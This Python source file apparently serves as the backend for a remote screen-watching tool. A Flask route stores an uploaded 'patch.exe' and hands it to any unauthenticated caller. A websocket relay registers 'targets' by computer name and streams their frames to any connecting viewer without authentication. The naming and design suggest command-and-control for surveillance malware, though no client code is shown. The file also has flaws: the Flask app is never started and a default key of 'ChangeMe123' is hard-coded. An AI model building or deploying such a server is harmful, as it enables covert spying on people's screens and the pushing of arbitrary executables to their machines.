from flask import Flask, request, jsonify, redirect, url_for,Response
import time
import threading
import os
import threading
import base64
import tkinter as tk
from tkinter import messagebox, ttk
from io import BytesIO
from PIL import Image, ImageTk
import asyncio
import json
import logging
import websockets

VERSION_FILE = os.path.join(os.path.abspath(os.path.dirname(__file__)), "version.txt")
def get_current_version():
    if not os.path.exists(VERSION_FILE):
        with open(VERSION_FILE, "w") as f:
            f.write("1")  # Default starting version
        return "1"
    with open(VERSION_FILE, "r") as f:
        return f.read().strip()
def save_version(number):
    with open(VERSION_FILE, "w") as f:
        f.write(str(number).strip())
PATCH_DIR = os.path.join(os.path.abspath(os.path.dirname(__file__)), "patches")
if not os.path.exists(PATCH_DIR):
    os.makedirs(PATCH_DIR)

app = Flask(__name__)
liveusers = {}

class LiveUser:
    def __init__(self, address):
        self.address = address
        self.lastinput = time.time()
        self.is_alive = True
        self.current_frame = None  
        
        print(f"Live session initialized for {address}")
        self.thread = threading.Thread(target=self._monitor_loop, daemon=True)
        self.thread.start()

    def ping(self, frame_data=None, frame_files=None):
        self.lastinput = time.time()
        if frame_data:
            self.current_frame = frame_data  
        if frame_files is not None:
            self.current_files = frame_files  
        print(f"[{self.address}] Session status verified.")

    def _monitor_loop(self):
        while self.is_alive:
            if time.time() - self.lastinput > 10:
                print(f"[{self.address}] Timeout reached. Cleaning session.")
                self.disconnect()
                break
            time.sleep(1)

    def disconnect(self):
        self.is_alive = False
        if str(self.address) in liveusers:
            del liveusers[str(self.address)]

def get_ip():
    x_forwarded = request.headers.get("X-Forwarded-For")
    if x_forwarded:
        return x_forwarded.split(",")[0].strip()
    return request.remote_addr


# --- ACCESS RULES ---
KEY_FILE = "KEY.TXT"
if not os.path.exists(KEY_FILE):
    with open(KEY_FILE, "w") as f:
        f.write("ChangeMe123")

with open(KEY_FILE, "r") as f:
    SITE_SECRET_KEY = f.read().strip()


@app.before_request
def restrict_access():
    # These must match the exact def names of your functions
    allowed_routes = ["login", "submit_key", "live", "get_patch","get_patch_version","request_download", "receive_download", "retrieve_file"]
    
    if request.endpoint in allowed_routes:
        return
        
    user_cookie = request.cookies.get("site_access_token")
    if user_cookie != SITE_SECRET_KEY:
        return redirect(url_for("login"))

@app.route("/patch_number", methods=["GET"])
def get_patch_version():
    current_ver = get_current_version()
    return jsonify({
        "status": "success",
        "patch_number": current_ver
    })

@app.route("/patch", methods=["GET", "POST"])
def patch_upload():
    if request.method == "POST":
        if "patch_file" not in request.files:
            return jsonify({"status": "error", "message": "No file part in the request"}), 400
            
        file = request.files["patch_file"]
        version_input = request.form.get("version_number", "").strip()
        
        if file.filename == "":
            return jsonify({"status": "error", "message": "No file selected"}), 400
            
        if not version_input:
            return jsonify({"status": "error", "message": "No version number provided"}), 400
            
        if file:
            # Save the file
            target_path = os.path.join(PATCH_DIR, "patch.exe")
            file.save(target_path)
            
            # Save the new version sequence to the version text file
            save_version(version_input)
            
            return jsonify({
                "status": "success", 
                "message": f"Patch uploaded successfully as version {version_input}"
            })

    # Updated inline interface containing the version assignment input
    current_ver = get_current_version()
    return f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>Upload Patch</title>
        <style>
            body {{ background: #0d0e15; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
            .upload-box {{ background: #1a1c2e; padding: 30px; border-radius: 8px; border: 1px solid #2e3152; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.5); width: 320px; }}
            input[type="file"] {{ margin: 15px 0; color: #a0aec0; }}
            input[type="text"] {{ background: #0d0e15; border: 1px solid #2e3152; color: white; padding: 10px; border-radius: 4px; width: 90%; text-align: center; margin-bottom: 20px; }}
            button {{ background: #3b82f6; color: white; border: none; padding: 12px 24px; border-radius: 4px; cursor: pointer; width: 100%; font-size: 1rem; font-weight: bold; }}
            button:hover {{ background: #2563eb; }}
            p {{ color: #a0aec0; font-size: 0.9rem; }}
        </style>
    </head>
    <body>
        <div class="upload-box">
            <h2>UPGRADE SYSTEM PATCH</h2>
            <p>Current Server Version: <strong>{current_ver}</strong></p>
            <form action="/patch" method="POST" enctype="multipart/form-data">
                <input type="text" name="version_number" placeholder="New Version (e.g., 2 or 1.0.4)" required autocomplete="off">
                <input type="file" name="patch_file" required autocomplete="off"><br>
                <button type="submit">UPLOAD & APPLY</button>
            </form>
        </div>
    </body>
    </html>
    """

@app.route("/getpatch", methods=["GET"])
def get_patch():
    target_path = os.path.join(PATCH_DIR, "patch.exe")
    
    if not os.path.exists(target_path):
        return jsonify({"status": "error", "message": "Patch file not found on server"}), 404

    # 1. Create a generator that reads the file in binary mode from the server's disk
    def generate_file_stream():
        with open(target_path, "rb") as f:
            while True:
                chunk = f.read(16384) # 16KB blocks
                if not chunk:
                    break
                yield chunk

    # 2. Grab the exact file size on disk to provide a proper header
    file_size = os.path.getsize(target_path)

    # 3. Stream the response directly over the socket connection
    response = Response(generate_file_stream(), mimetype="application/octet-stream")
    response.headers["Content-Length"] = file_size
    response.headers["Content-Disposition"] = "attachment; filename=patch.exe"
    
    print(f"[Server] Streaming patch.exe raw binary ({file_size} bytes) directly to client...")
    return response

# Setup basic logging to monitor connections on the Render dashboard
logging.basicConfig(level=logging.INFO)

# Global states
live_targets = {}     # Store active targets: { "Target-PC": websocket_connection }
connected_viewers = set() # Set of all active viewer dashboard websockets

async def handle_client(websocket):
    client_type = None
    target_name = None
    addr = websocket.remote_address
    logging.info(f"New connection established from {addr}")

    try:
        async for message in websocket:
            payload = json.loads(message)
            msg_type = payload.get("type")

            # --- 1. REGISTRATION PHASE ---
            if msg_type == "register_viewer":
                client_type = "viewer"
                connected_viewers.add(websocket)
                logging.info(f"Viewer registered from {addr}")
                
                # Send current live targets list immediately upon joining
                current_list = list(live_targets.keys())
                await websocket.send(json.dumps({"type": "list", "data": current_list}))

            elif msg_type == "register_target":
                client_type = "target"
                target_name = payload.get("COMPUTERNAME", f"Target-{addr[1]}")
                live_targets[target_name] = websocket
                logging.info(f"Target registered: {target_name}")

                # Alert all active viewers that a new target is online
                await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

            # --- 2. DATA STREAM RELAY PHASE ---
            elif msg_type == "stream_frame" and client_type == "target":
                frame_data = payload.get("frame")
                
                # package frame and relay out to all viewers
                relay_payload = {
                    "type": "frame",
                    "user": target_name,
                    "frame": frame_data
                }
                await broadcast_to_viewers(relay_payload)
                
                # Send acknowledgement response back to the target client
                await websocket.send(json.dumps({"status": "OK"}))

    except websockets.ConnectionClosed:
        logging.info(f"Connection closed normally for {addr}")
    except Exception as e:
        logging.error(f"Error handling connection {addr}: {e}")
    finally:
        # --- 3. CLEANUP DISCONNECTED INSTANCES ---
        if websocket in connected_viewers:
            connected_viewers.remove(websocket)
        if client_type == "target" and target_name in live_targets:
            del live_targets[target_name]
            logging.info(f"Target offline: {target_name}")
            # Update target listbox for all remaining viewers
            await broadcast_to_viewers({"type": "list", "data": list(live_targets.keys())})

async def broadcast_to_viewers(payload_dict):
    """Helper utility to push messages to all active viewers concurrently."""
    if not connected_viewers:
        return
    message = json.dumps(payload_dict)
    # Gather tasks to fire them off in parallel safely
    await asyncio.gather(*[viewer.send(message) for viewer in connected_viewers], return_exceptions=True)

async def main():
    # Render assigns an environment variable named PORT dynamically (defaults to 10000)
    port = int(os.environ.get("PORT", 10000))
    logging.info(f"Starting server engine on port {port}...")
    async with websockets.serve(handle_client, "0.0.0.0", port):
        await asyncio.Future() # Run server indefinitely

if __name__ == "__main__":
    asyncio.run(main())